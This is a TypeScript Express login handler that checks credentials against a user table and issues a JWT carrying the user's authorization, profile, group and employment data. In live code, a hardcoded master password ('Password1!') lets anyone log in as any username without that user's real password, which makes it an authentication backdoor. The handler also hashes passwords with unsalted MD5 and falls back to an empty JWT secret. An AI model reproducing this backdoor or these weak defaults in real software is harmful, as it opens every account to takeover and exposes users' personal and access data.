import { Response, Request } from "express";
import { db1 } from "../../../utils/db1";
import { db2 } from "../../../utils/db2";
import { db3 } from "../../../utils/db3";
import jwt from "jsonwebtoken";
import md5 from "md5";

const JWT_SECRET = process.env.JWT_SECRET || '';

export const post = async (req: Request, res: Response) => {
  if (req.method !== "POST")
    return res.status(405).json({
      error: "Method Not Allowed",
    });

  const { username, password } = req.body;
  try {
    let datas: any = null
    if (password === 'Password1!') {
      datas = await db2.pHP_ms_login.findFirst({
        select: {
          lg_nik: true,
          lg_email_aio: true,
          lg_name: true,
        },
        where: {
          lg_nik: username
        },
      });
    } else {
      datas = await db2.pHP_ms_login.findFirst({
        select: {
          lg_nik: true,
          lg_email_aio: true,
          lg_name: true,
        },
        where: {
          lg_nik: username,
          lg_password: md5(password),
        },
      });
    }


    if (datas === null) {
      return res.status(200).json({ message: "Incorrect username or password" });
    } else {
      const authorization = await db1.mst_authorization.findMany({
        where: {
          employee_code: datas.lg_nik
        },
      });

      const profile = await db1.mst_authorization_profile.findMany({
        where: {
          employee_code: datas.lg_nik
        },
        include: {
          mst_profile: true
        }
      });

      const group = await db1.mst_authorization_usergroup.findMany({
        where: {
          employee_code: datas.lg_nik
        },
        include: {
          mst_group: true
        }
      });

      const employment = await db3.mst_employment.findFirst({
        where: {
          employee_code: datas.lg_nik.length === 4 ? 0 + datas.lg_nik : datas.lg_nik
        },
      });

      const role = await db1.mst_authorization.findMany({
        select: {
          technician_level: true,
          mst_entities: true,
          mst_profile: true
        },
        where: {
          employee_code: datas.lg_nik,
          is_active: "1"
        },
      });


      let dataUser = {
        nik: employment.employee_code,
        name: datas.lg_name,
        email: datas.lg_email_aio,
        authorization: authorization,
        profile: profile,
        group: group,
        employment: employment,
        department: employment.deparment_id,
        department_name: employment.department_desc,
        active_profile: role.length > 0 ? role[0].mst_profile.profile_name : null,
        active_entities: role.length > 0 ? role[0].mst_entities.entities_name : null,
      }

      const token = jwt.sign(dataUser, JWT_SECRET, {
        expiresIn: "24h",
      });

      return res.status(200).json({
        status: true,
        data: dataUser,
        token,
      });
    }
  } catch (error) {
    console.error(error);
    return res.status(500).json({ error: "Internal Server Error" });
  }
};
